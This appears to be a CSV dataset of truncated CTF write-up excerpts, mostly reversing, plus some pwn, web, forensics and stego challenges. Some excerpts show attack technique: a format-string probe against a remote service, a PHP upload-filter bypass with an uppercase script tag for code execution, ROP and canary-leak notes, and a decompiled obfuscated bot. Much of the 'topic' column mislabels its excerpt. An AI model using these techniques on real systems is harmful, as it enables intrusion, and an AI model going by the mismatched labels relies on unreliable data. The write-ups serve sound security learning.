dataset,identifier,repo,relative_path,title,topic,excerpt
ctf_writeup,writeups-82,writeups,ekoparty-ctf-2015/reversing/Malware/sudhackar/README.md,sudhackar,command_injection,"[](ctf=ekoparty-ctf-2015) [](type=reversing) [](tags=malware,control,pickle,RSA) [](tools=Twitter,easy-python-decompiler) [](techniques=Decompiling) # Malware (rev-200) We have a [zip](../rev200.zip). Extract and we get ```bash $ file ekobot_final.pyc ekobot_final.pyc: python 2.7 byte-compiled ``` Byte-compiled python can be very easily decompiled. So here I use [Easy Python Decompiler](http://sourceforge.net/projects/easypythondecompiler/). We get an [output](ekobot_final.py) which is scary! ```python # Embedded file name: ekobot_final.py import os import sys import httplib2 import cPickle from Crypto.PublicKey import RSA from base64 import b64decode from twython import Twython if 0: i11iIiiIii OO0o = 'ekoctf' if 0: Iii1I1 + OO0O0O % iiiii % ii1I - ooO0OO000o if len(sys.argv) != 2: os._exit(0) if 0: IiII1IiiIiI1 / iIiiiI1IiI1I1 o0OoOoOO00 = sys.argv[1] if 0: OOOo0 / Oo - Ooo00oOo00o.I1IiI o0OOO = 'ienmDwTNHZVR9si4SzeCg1glB' iIiiiI = 'TTlOJrwq5o9obnRyQXRyaOkRoYUBTrCzN9j9IHX0Bc4dS2xBHN' if 0: iii1II11ii * i11iII1iiI + iI1Ii11111iIi + ii1II11I1ii1I + oO0o0ooO0 - iiIIIII1i1iI def o0oO0(): oo00 = 0 if os.path.isfile(o0OoOoOO00): try: o00 = open(o0OoOoOO00, 'r') oo00 = int(o00.readline("
ctf_writeup,writeups-83,writeups,csaw-finals-2021/reverse/control/sudhackar/README.md,sudhackar,command_injection,"[](ctf=csaw-finals-2021) [](type=reverse) [](tags=ida) [](tools=ida,pin,gdb) # control (re) ```sh [csaw] file control control.bin control: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=4276a8d2c0e4c4a4e0e444f7f10d3f4b2c2b0409, for GNU/Linux 3.2.0, stripped control.bin: data ``` 2 files were provided. ELF was about 15K in size and the bin file was about 21K. The ELF is not obfuscated and easily decompiles in IDA to a very simple C code. The binary has implemented a custom VM and control.bin is the bytecode. `main` function loads the bytecode and has the vm evaluation loop. ```c while ( op >= 0 ) { op = ptr[vip]; if ( (op & 0x40000) != 0 ) c = r6 + r7; if ( (op & 0x80000) != 0 ) c = r6 * r7; if ( (op & 0x20000) != 0 ) { if ( r7 <= 0 ) v3 = r6 << -(char)r7; else v3 = (unsigned int)r6 >> r7; c = v3; } if ( (op & 0x100000) != 0 ) c = r6 ^ r7; if ( (op & 0x200000) != 0 ) c = r6 == r7; if ( (op & 4) != 0 ) ridx = r1; if ( (op & 0x20) != 0 ) ridx = r2; if ( (op & 0x100) != 0 ) ridx = r3; if ( (op & 0x800) != 0 ) ridx = r4; if ( (op & 0x4000) != 0 ) ridx = r5; if ( (op & 2) != 0 ) c = r1; if ( (op & 0x10) !"
ctf_writeup,writeups-84,writeups,csaw-finals-2021/reverse/maze/sudhackar/README.md,sudhackar,command_injection,"[](ctf=csaw-finals-2021) [](type=reverse) [](tags=ida) [](tools=ida) # maze (re) ```sh [csaw2021-fin] file maze_public maze_public: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, stripped ``` maze is a simple ELF file without any tricks. A simple `start` to read flag, check and return ```c sys_write(1u, buf, 0x1AuLL); sys_read(0, input, 0x64uLL); x = sub_403EB6(input); // use r15 as return if (x == 0x40){ v2 = sys_write(1u, aWellDonePlease, 0x3BuLL); } else { v2 = sys_write(1u, aTryAgain, 0xCuLL); } sys_exit(1); ``` `sub_403EB6` is a simple function too. Only thing is `.text` is mapped `rwx` and this function patches entry to ret `c3` on return such that any next call is a no-op and ret. The logic is pretty straightforward too. ![node](node.png) It reads the first byte from the flag and considers it as a digit. If the digit is in 1-8 range then a tuple of values is set and used to calculate a jump. Looking at the destination of the jump we find that there are multiple copies of the same `sub_403EB6` with the same code. So the binary is basically and array of same check functions that continue jumping to each other and return if you call the same function tw"
ctf_writeup,writeups-85,writeups,csaw-finals-2018/reverse/1nsayne/sudhackar/README.md,sudhackar,format_string,"[](ctf=csaw-finals-2018) [](type=reverse) [](tags=fibonacci) [](tools=radare2,r2) # 1nsayne (rev-250) We are given a [binary](../1nsayne). ```sh $ file 1nsayne 1nsayne: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, stripped ``` On running it waits for some input. Input is later compared with so0per_cool. ```sh $ ltrace -fbi ./1nsayne [pid 25528] [0x400890] setvbuf(0x7f3ac22df760, 0, 2, 0) = 0 [pid 25528] [0x4038b5] fgets(lol ""lol\n"", 99, 0x7f3ac22dea00) = 0x6042a0 [pid 25528] [0x4038c7] strchr(""lol\n"", '\n') = ""\n"" [pid 25528] [0x4036cb] strcmp(""lol"", ""so0per_cool"") = -7 [pid 25528] [0xffffffffffffffff] +++ exited (status 0) +++ ``` Simply passing so0per_cool as input starts printing some message. ```sh $ ltrace -fbi ./1nsayne [pid 26640] [0x400890] setvbuf(0x7f70174cb760, 0, 2, 0) = 0 [pid 26640] [0x4038b5] fgets(so0per_cool ""so0per_cool\n"", 99, 0x7f70174caa00) = 0x6042a0 [pid 26640] [0x4038c7] strchr(""so0per_cool\n"", '\n') = ""\n"" [pid 26640] [0x4036cb] strcmp(""so0per_cool"", ""so0per_cool"") = 0 [pid 26640] [0x403119] strlen(""so0per_cool"") = 11 [pid 26640] [0x403119] strlen(""so0per_cool"") = 11 ["
ctf_writeup,writeups-86,writeups,bostonkeyparty-2016/reverse/Alewife/sudhackar/README.md,sudhackar,command_injection,"[](ctf=internetwasche-ctf-2016) [](type=reverse) [](tags=prime,fraction,fractran,math) [](tools=hopper,gdb) [](techniques=) # Alewife reverse-5 We are given ```bash $ file 05223a3cae8b71d81592d5977fb1c3622bcbf793 05223a3cae8b71d81592d5977fb1c3622bcbf793: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=a4d814d0167c1c0732e8fdf0e25c368c61d6b27d, not stripped ``` I throw it at hopper. Since it is not stripped it gets easily decompiled with all its variable names to [this](05223a3cae8b71d81592d5977fb1c3622bcbf793.c). ```c int primes[0xAB] = {2, 3, 5, 7, 11, 13, 17, 19, 23, 29, 31, 37, 41, 43, 47, 53, 59, 61, 67, 71, 73, 79, 83, 89, 97, 101, 103, 107, 109, 113, 127, 131, 137, 139, 149, 151, 157, 163, 167, 173, 179, 181, 191, 193, 197, 199, 211, 223, 227, 229, 233, 239, 241, 251, 257, 263, 269, 271, 277, 281, 283, 293, 307, 311, 313, 317, 331, 337, 347, 349, 353, 359, 367, 373, 379, 383, 389, 397, 401, 409, 419, 421, 431, 433, 439, 443, 449, 457, 461, 463, 467, 479, 487, 491, 499, 503, 509, 521, 523, 541, 547, 557, 563, 569, 571, 577, 587, 593, 599, 601, 607, 613, 617, 619, 631, 641, 643,"
ctf_writeup,writeups-87,writeups,internetwache-ctf-2016/code/a-numbers-game-2/chaitan94/README.md,chaitan94,other,"[](ctf=internetwasche-ctf-2016) [](type=code) [](tags=bot,crypto,math) [](tools=sympy) [](techniques=) # A Numbers Game II (code-70) > Math is used in cryptography, but someone got this wrong. Can you still solve the equations? Hint: You need to encode your answers. We are given the following information in a flag: > This snippet may help: > > ```python > def encode(self, eq): > out = [] > for c in eq: > q = bin(self._xor(ord(c),(2<<4))).lstrip(""0b"") > q = ""0"" * ((2<<2)-len(q)) + q > out.append(q) > b = ''.join(out) > pr = [] > for x in range(0,len(b),2): > c = chr(int(b[x:x+2],2)+51) > pr.append(c) > s = '.'.join(pr) > return s > ``` Now we have a service running on 188.166.133.53:11071, which gives messages like this > Hi, I like math and cryptography. Can you talk to me?! > Level 1.: 4.4.5.3.3.3.3.3.3.3.6.4.3.3.3.3.3.4.3.4.3.4.3.3.3.3.3.3.3.4.6.4.3.3.3.3.3.3.6.4.3.4.4.5 Obviously, to be able to reply, we need to be able to understand the encoded message. We need to write a decoding function before we can proceed further. So, let's do that. The given encoding function does the following things to encode a string: 1. Consider the string as a byte-stream and XOR with 32 for each by"
ctf_writeup,writeups-88,writeups,internetwache-ctf-2016/exploit/remote-printer/sudhackar/README.md,sudhackar,format_string,"[](ctf=internetwasche-ctf-2016) [](type=exploit) [](tags=format string) [](tools=libformatstr) [](techniques=format string) # Remote Printer (exp-80) >Description: Printer are very very important for offices. Especially for remote printing. My boss told me to build a tool for that task. >Attachment: exp80.zip >Service: 188.166.133.53:12377 Unzipping the [file](../exp80.zip) gives us the following. ```bash $ file RemotePrinter RemotePrinter: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=3db29aea1dc4af0eb3f7104e529f856256a1d775, stripped ``` If we run it with ```bash $ nc -l -p 8000 -vv ``` in another terminal. ```bash $ ./RemotePrinter This is a remote printer! Enter IPv4 address:127.0.0.1 Enter port:8000 ``` gives us a connection on the listening port. ```bash $ nc -l -p 8000 -vv listening on [any] 8000 ... connect to [127.0.0.1] from Hack-Machine [127.0.0.1] 38908 %p.%p.%p sent 9, rcvd 0 ``` ```bash $ ./RemotePrinter This is a remote printer! Enter IPv4 address:127.0.0.1 Enter port:8000 Thank you, I'm trying to print 127.0.0.1:8000 now! 0xffc8425c.0x2000.(nil) ``` So yeah! Format st"
ctf_writeup,writeups-89,writeups,hackover-ctf-2015/pwn/easy-shell/sudhackar/README.md,sudhackar,buffer_overflow,"[](ctf=hackover-2015) [](type=pwn) [](tags=buffer-overflow,ROP) [](tools=pwntools,gdb-peda) [](techniques=ROP) # easy-shell (pwn-75) We have a [zip](../easy_shell-2fdf5e4dea11c1e96f0a81971b096e48.tgz) file. Unzipping it gives us ```bash $ file easy_shell easy_shell: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=db8c496a9a78e4d2b5088ef340c422f757888559, not stripped $ ./easy_shell .-""; ! ;""-. .'! : | : !`. /\ ! : ! : ! /\ /\ | ! :|: ! | /\ ( \ \ ; :!: ; / / ) ( `. \ | !:|:! | / .' ) (`. \ \ \!:|:!/ / / .') \ `.`.\ |!|! |/,'.' / `._`.\\\!!!// .'_.' `.`.\\|//.'.' |`._`n'_.'| ""----^----"">> nom nom, shell> AAAA ``` Easy shell should be easy. Lets start! Dump of assembler code for function main: ```objdump 0x080484d6 <+0>: lea ecx,[esp+0x4] 0x080484da <+4>: and esp,0xfffffff0 0x080484dd <+7>: push DWORD PTR [ecx-0x4] 0x080484e0 <+10>: push ebp 0x080484e1 <+11>: mov ebp,esp 0x080484e3 <+13>: push ecx => 0x080484e4 <+14>: sub esp,0x4 0x080484e7 <+17>: call 0x804847b <do_stuff> 0x080484ec <+22>: mov eax,0x2a 0x080484f1 <+27>: add esp,0x4 0x080484f4 <+30>: pop ecx 0x080484f5 <+31>: pop ebp 0x0"
ctf_writeup,writeups-90,writeups,hackover-ctf-2015/reverse/goto/sudhackar/README.md,sudhackar,command_injection,"[](ctf=hackover-2015) [](type=reverse) [](tags=reverse,recovery) [](tools=binwalk,gdb-peda) # goto (reverse-150) We have a [zip](../goto-03661d1a42ad20065ef6bfbe5a06287c.tgz) file. Unzipping it gives us a file goto.bin ```bash $ file goto.bin goto.bin: data ``` data is somewhat nasty for a 150 pt challenge. So I used binwalk on it. ```bash $ binwalk -e goto.bin DECIMAL HEXADECIMAL DESCRIPTION -------------------------------------------------------------------------------- 74 0x4A gzip compressed data, maximum compression, has original file name: ""rvs"", from Unix, last modified: Thu Oct 15 19:19:35 2015 $ file _goto.bin.extracted/rvs _goto.bin.extracted/rvs: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), for GNU/Linux 2.6.24, dynamically linked, interpreter \004, stripped ``` This could work. ```bash $ ./rvs PASSWORD:sudhackar ACCESS DENIED ``` I have observed it in many CTFs that how much has gdb-peda made the problems trivial to solve. So we quickly load it in gdb-peda and step through the program. ```bash gdb-peda$ b *0x400630 Breakpoint 1 at 0x400630 gdb-peda$ b *0x4006aa Breakpoint 2 at 0x4006aa ``` After some running and stepping. ```bash gdb-peda$ c Continuing. [-------"
ctf_writeup,writeups-91,writeups,hackover-ctf-2015/web/hack-the-planet/sudhackar/README.md,sudhackar,other,"[](ctf=hackover-2015) [](type=web) [](tags=headers) [](tools=burp-proxy) # hack-the-planet (web-50) ``` Hacking a site is basic task for any skilled hacker. Methods range from brute force to talking to people. No matter which method you choose, don't forget to use head. HINT: His question is the answer http://hack-the-planet.hackover.h4q.it ``` Partial code from [source](../hack-the-planet-275983b5101b4c089443f0486c6bfb03.go). ```go package main const ( flagPW = ""XXX"" flag = ""hackover15{XXX}"" ) func login(w http.ResponseWriter, r *http.Request) { switch r.Method { case ""HEAD"": hint(w, r) case ""POST"": check(w, r) default: gotoFail(w, r, ""/fail.jpg"", http.StatusMethodNotAllowed) } } func hint(w http.ResponseWriter, r *http.Request) { if r.Header.Get(""X-XXX"") == ""XXX"" { w.Header().Set(""X-XXX"", flagPW) w.WriteHeader(http.StatusAccepted) return } w.Header().Set(""X-XXX"", ""XXX"") w.WriteHeader(http.StatusPartialContent) } func check(w http.ResponseWriter, r *http.Request) { if err := r.ParseForm(); err != nil { gotoFail(w, r, ""fail.jpg"", 401) } if r.PostForm.Get(""pw"") != flagPW { gotoFail(w, r, ""fail.jpg"", 401) } w.WriteHeader(http.StatusAccepted) if _, err := w.Write([]byte(flag)); err !="
ctf_writeup,writeups-92,writeups,csaw-finals-2016/reverse/rev250/sudhackar/README.md,sudhackar,format_string,"[](ctf=csaw-finals-2016) [](type=reverse) [](tags=z3, constraint solving) [](tools=z3) [](techniques=constraint solving, symbolic execution) # packer (rev-250) We are given a [file](../packer-release) ```bash $file packer-release packer-release: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=30e7a8e386f33bb6bdf8a7701d7169584f9db7a9, stripped ``` Opening it in hopper gives a pretty neat decompilation. ```c main() { esi = arg1; if (arg0 == 0x2) { eax = malloc(0x1f); ebx = eax; *0x804a034 = eax; eax = *(esi + 0x4); strncpy(ebx, eax, 0x1f); *(int8_t *)(ebx + 0x1e) = 0x0; edx = *(ebx + 0xd); eax = *(ebx + 0x15); if (eax + edx == 0xe1d4e090) { *0x804a030 = *0x804a030 ^ 0xb93e4867; } if (eax + *(ebx + 0x19) == 0x94e860d0) { *0x804a030 = *0x804a030 ^ 0xb9f7a2ff; } esi = *(ebx + 0x9); if (esi + eax == 0xcdd6d8c1) { *0x804a030 = *0x804a030 ^ 0x7e3c14cd; } ecx = *(ebx + 0x11); if (ecx + *(ebx + 0x5) == 0x93e1a69f) { *0x804a030 = *0x804a030 ^ 0x21ddc691; } if (esi + edx == 0xcd929799) { *0x804a030 = *0x804a030 ^ 0x65aafd58; } if (eax + ecx == 0x9fa6cfd3) { *0x804a030 = *0x804a030 ^ 0x372f660e; } "
ctf_writeup,writeups-93,writeups,trend-micro-ctf-2017/analysis-offensive/300/sudhackar/README.md,sudhackar,command_injection,"[](ctf=trend-micro-ctf-2017) [](type=analysis,reverse) [](tags=android) [](tools=jd-gui,dex2jar) [](techniques=bruteforce) # analysis-offensive 300 *Disclaimer : This is not the smart way to do this, but its easy if you have an android development setup.* So we have an apk file. ```bash $ file TrendGacha.apk TrendGacha.apk: Zip archive data, at least v2.0 to extract $ unzip -qq TrendGacha.apk -d TrendGacha $ ls TrendGacha AndroidManifest.xml classes.dex lib META-INF res resources.arsc $ cd TrendGacha $ ~/tools/dex2jar/d2j-dex2jar.sh classes.dex dex2jar classes.dex -> ./classes-dex2jar.jar ``` I also installed the apk on a device to test it. ![Main](menu.png) The functions are quite simple. When you click on `GET GACHA!` it'll choose a character of the flag and give it to you. All your leaked chars can then be seen later in the `HISTORY`. Looking in the output of jd-gui on the jar. The code for `GET GACHA!`. ```java public void run() { Intent localIntent = new Intent(""com.tm.ctf.trendgacha.GET_GACHA""); if (a.N() == null) { a.b(a.this.i().getApplicationContext()); } a.N().sendBroadcast(localIntent); a.a(a.this, true); } ``` So the button sends a com.tm.ctf.trendgacha.GET_GACHA intent"
ctf_writeup,writeups-94,writeups,mma-ctf-2015/forensics/splitted/chaitan94/README.md,chaitan94,other,"[](ctf=mma-ctf-2015) [](type=forensics) [](tags=) [](tools=wireshark,gimp) [](techniques=) # Splitted (forensics-30) We're given [a pcap file](../splited.pcap), let's go ahead and open it in wireshark. We can easily see that a file called 'flag.zip' is being sent.. Let's filter required packets: > http && ip.src==192.168.4.10 We see 8 packets, so exported all the 8 packets as HTTP objects (File > Export Objects.. > HTTP). From wireshark we can the range of each HTTP response, as follows. Packet No | Range start ----------|------------ 16 | 2345 26 | 0 36 | 1407 46 | 2814 56 | 3283 66 | 469 76 | 938 86 | 1386 Sorted them according to range start Packet No | Range start ----------|------------ 26 | 0 66 | 469 76 | 938 86 | 1386 36 | 1407 16 | 2345 46 | 2814 56 | 3283 Renamed the exported packets to follow this order, and assembled them: ```bash $ mv packet-26 part-1.zip $ mv packet-66 part-2.zip $ mv packet-76 part-3.zip $ mv packet-86 part-4.zip $ mv packet-36 part-5.zip $ mv packet-16 part-6.zip $ mv packet-46 part-7.zip $ mv packet-56 part-8.zip $ cat part-*.zip > flag.zip $ unzip flag.zip ``` We see a file called 'flag.psd'. Opening it in GIMP, we see flag in the bottom layer ![S"
ctf_writeup,writeups-95,writeups,mma-ctf-2015/web/uploader/chaitan94/README.md,chaitan94,command_injection,"[](ctf=mma-ctf-2015) [](type=web) [](tags=php,lfi,rce) [](tools=) [](techniques=) # Uploader (web-100) Website says 'You can upload any file!', and really lets us. But when uploading text files, it removes any '<?' or 'php' as mentioned in the problem. Obviously, this question is based on LFI+Remote Code Execution, we need to get our php running there somehow. First I tried uploading various variations of php hello world, like: ```php <?php echo 'Hello world!'; ``` ```php <? echo 'Hello world!'; ``` ```shell #!/usr/bin/php -r echo 'Hello world!'; ``` Nothing seemed to work. Since '<?'s are being removed, I tried: ```php <<?? echo 'Hello world!'; ``` Still, no use. Is it possible to run without <? tags? After googling, we see from php manual page that, we can use these tags instead: ```php <script language=""php""> echo('Hello world!'); </script> ``` But after uploading, the word 'php' is removed, resulting in ```php <script language=""""> echo('Hello world!'); </script> ``` I was out of ideas. But after a long time, I realized that question only talks about removing 'php', but does it remove 'PHP' (uppercase) ? Let's find out: ```php <script language=""PHP""> echo('Hello world!'); </scri"
ctf_writeup,writeups-96,writeups,mma-ctf-2015/stego/nagoya-castle/chaitan94/README.md,chaitan94,other,"[](ctf=mma-ctf-2015) [](type=stego) [](tags=) [](tools=stegosolve) [](techniques=) # Nagoya Castle (stego-100) One image was given: ![Nagoya castle](../problem.png) It was simpler than I expected. Downloaded the image, opened it in [StegoSolve](http://www.caesum.com/handbook/Stegsolve.jar). ![Screenshot](screenshot.png) Aand there's our flag > MMA{raw_cr3am_pasta!}"
ctf_writeup,writeups-97,writeups,defcon-ctf-qualifier-2016/babys-first/baby-re/sudhackar/README.md,sudhackar,format_string,"[](ctf=defcon-qualifier-2015) [](type=reverse) [](tags=equation-solver) [](tools=angr) # baby-re (babys-first 1) ### ~~math required~~ We are given a file ```bash $ file baby-re baby-re: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=5d5783d23d78bf70b80d658bccbce365f7448693, not stripped ``` Test-run ```bash $ ./baby-re Var[0]: 10 Var[1]: 10 Var[2]: 10 Var[3]: 101 Var[4]: 10 Var[5]: 10 Var[6]: 10 Var[7]: 10 Var[8]: 10 Var[9]: 10 Var[10]: 10 Var[11]: 10 Var[12]: 10 Wrong ``` So the problem looks simple, a simple keygen-me. Throw it to Hopper and ```c int main() { var_28 = *0x28; printf(""Var[0]: ""); fflush(rax); __isoc99_scanf(0x402a11, var_60); printf(0x402a14); fflush(rax); __isoc99_scanf(0x402a11, var_60 + 0x4); printf(""Var[2]: ""); fflush(rax); __isoc99_scanf(0x402a11, var_60 + 0x8); printf(""Var[3]: ""); fflush(rax); __isoc99_scanf(0x402a11, var_60 + 0xc); printf(""Var[4]: ""); fflush(rax); __isoc99_scanf(0x402a11, var_60 + 0x10); printf(""Var[5]: ""); fflush(rax); __isoc99_scanf(0x402a11, var_60 + 0x14); printf(""Var[6]: ""); fflush(rax); __isoc99_scanf(0x402a11, var_60 + 0x18); printf"
ctf_writeup,writeups-98,writeups,riceteacatpanda-2020/ai/meta-dreams/vn-ki/README.md,vn-ki,other,"# meta-dreams #### Category: AI #### Pts: 1750 We are give a pth file. Some initial investigations show that it might be a pytorch save file. Let's open it and see. It's getting opened correctly. Let's look at the keys ```python In [3]: checkpoint.keys() Out[3]: odict_keys(['conv1.conv2d.weight', 'conv1.conv2d.bias', 'in1.weight', 'in1.bias', 'conv2.conv2d.weight', 'conv2.conv2d.bias', 'in2.weight', 'in2.bias', 'conv3.conv2d.weight', 'conv3.conv2d.bias', 'in3.weight', 'in3.bias', 'res1.conv1.conv2d.weight', 'res1.conv1.conv2d.bias', 'res1.in1.weight', 'res1.in1.bias', 'res1.conv2.conv2d.weight', 'res1.conv2.conv2d.bias', 'res1.in2.weight', 'res1.in2.bias', 'res2.conv1.conv2d.weight', 'res2.conv1.conv2d.bias', 'res2.in1.weight', 'res2.in1.bias', 'res2.conv2.conv2d.weight', 'res2.conv2.conv2d.bias', 'res2.in2.weight', 'res2.in2.bias', 'res3.conv1.conv2d.weight', 'res3.conv1.conv2d.bias', 'res3.in1.weight', 'res3.in1.bias', 'res3.conv2.conv2d.weight', 'res3.conv2.conv2d.bias', 'res3.in2.weight', 'res3.in2.bias', 'res4.conv1.conv2d.weight', 'res4.conv1.conv2d.bias', 'res4.in1.weight', 'res4.in1.bias', 'res4.conv2.conv2d.weight', 'res4.conv2.conv2d.bias', 'res4.in2.weight', 'res4.in2.bi"
ctf_writeup,writeups-99,writeups,riceteacatpanda-2020/rev/number-lock/vn-ki/README.md,vn-ki,command_injection,"# Number Lock #### Category: rev #### pts: 1100 I was stuck at this chall for a long time. The breakthough came when the admins updated the files. The only file that was updated was the analytics.js file. That's when I realized that I was looking at the wrong file. When we look at the analytics.js file, its full of its repeating characters. One thing that comes to the mind is jsfuck. JSFuck website says `write any js with 6 characters`. That seems to be the case here. But the twist is that JSFuck output is xored with 104, so we decode that. ```python f = open('./analback.js') for i in f.read(): print(chr(ord(i) ^ 104), end='') ``` We try to decode the modified js using JSFuck but we get invalid JS. But the original decoded version works correctly. Given the original works, it's safe to assume JSFuck is doing something wrong. We can see from the jsfuck decoded output that the file is calling eval. Lets do a trick, `eval = console.log` and execute the original decoded version. Yay, we get this. ``` function guess(){ [][(![]+[])[+[]]+(![]+[])[!![]+!![]]+(![]+[])[+!![]]+(!![]+[])[+[]]][([]+[][(![]+[])[+[]]+(![]+[])[!![]+!![]]+(![]+[])[+!![]]+(!![]+[])[+[]]])[!![]+!![]+!![]]+(!![]+[][(!"
ctf_writeup,writeups-100,writeups,riceteacatpanda-2020/rev/ghost-in-the-system/vn-ki/README.md,vn-ki,other,"# Ghost in the system #### Category: rev #### Points: 1500 We get a binary `ls` which does what ls does. Open the binary in ghidra and search for `rtcp`, the flag format. We see there's a string and it is referenced in the main function of the binary. Go to the reference and scroll a bit down and we see the following code. ```c if (bVar4) { allocator(); /* try { // try from 00101296 to 0010129a has its CatchHandler @ 00101fcc */ basic_string((char *)&otxt, (allocator *) ""s}yvzezqr_6x45jx2yp4d38qq1mvnsl0u7w32lr12gi}t3i5kw0oewkqb_vv6726}}95cmfy_jfgyx25n1e9cuyvsor_0mijcnhoa2kpvdtjd9js2kstbe5}s6zgyil6qxtr}wbol}dzmg3t02466hu1gkpm2xv8u{ryn0s11uzu_426p8k4owb21f3buof6ok{cp9s2s88k3yhzdsq1d2u7n3}9ex}9sly0p0}lp5yxdi7m37_p82o54im1z7bw5u2tu9n2loybmr51jih8lxf7z6n62goh3_63cnnbfczhmsy4pe}ijluq9xbkk4d{c13s5hjkjldeww9z}78oyt1pog5qudz{6fkw_wgon99yc{7v4sakj6pddk5i1c_1g74e_xwivk7mmbm16it6zxfc1y6sdz{0zrmuvysbl}pmw8z6jb8ejmrqknxbu5w4sv542plnzs8_}znyq6b6x67ar0lsq04qu742uenp4ufoxz7ir8gzohi352}7{9hk{yu4_zbj7gmvl{c_24weh8rwxp_24dhp{giv9k}gz840uezqk9s}qxi{2u2lbbt4i}kq8gomrqewvrj65dgwaoitc99yh4jest6sccnz2wlgmap6f9k04lhanc3wmgpj6xawln_jce6c6vfttu{zws4odom7{h5hewr_{5}6fty4a14ar64q1vvg0s28zsik}nhpmw}j92s42k}zzxx0"
ctf_writeup,writeups-101,writeups,csaw-quals-2018/reverse/kvm/sudhackar/README.md,sudhackar,other,"[](ctf=csaw-finals-2018) [](type=reverse) [](tags=tree) [](tools=ida, r2) # kvm (rev-500) ``` Reversing kvm We found a mysterious program that none of our most talented hackers could even begin to figure out. Author: toshi Solves: 58 ``` We are given a [file](../chall-500-kvm.elf) This sets up a vm and a vcpu using KVM apis. An area is mmaped between both machines loaded at 0x0 in guest. Then `_payload` from the binary is copied to this area and `rip` is set to 0. This means code for vm begins at `0x202174` and probably ends at `0x20348C` Code at `0x202174` is quite straight forward: ![0x202174](start_vm.png) First it reads 0x2800 bytes, then it calls `process_byte` on every byte. This call should return 1 otherwise it goes to ""Wrong"" message. Aftet this `memcmp` is called to match two memory regions at addresses `0x1320` and `0x580` which also decide Correct/Wrong message. #### process_byte This is where the challenge starts. First basic block comes to an abrupt `hlt` ![process_byte](process_byte.png) Looking at the function that starts the VM with KVM_RUN, there's a handler to handle IO and check when machine halts; ```c if ( ioctl(*(_DWORD *)a2, 0x8090AE81uLL, &v7) < 0 ) { perro"
ctf_writeup,writeups-102,writeups,csaw-quals-2016/pwn/tutorial/sudhackar/README.md,sudhackar,rop,[](ctf=csaw-quals-2016) [](type=exploit) [](tags=bof) [](tools=ROPtool) [](techniques=ROP) # tutorial (pwn-200) [Binary](../tutorial) [Solution](tutorial.py) > Leak canary by overwriting its NULL byte > ROP your way out (just dup2() STDIN to the socket) [![asciicast](https://asciinema.org/a/86029.png)](https://asciinema.org/a/86029)
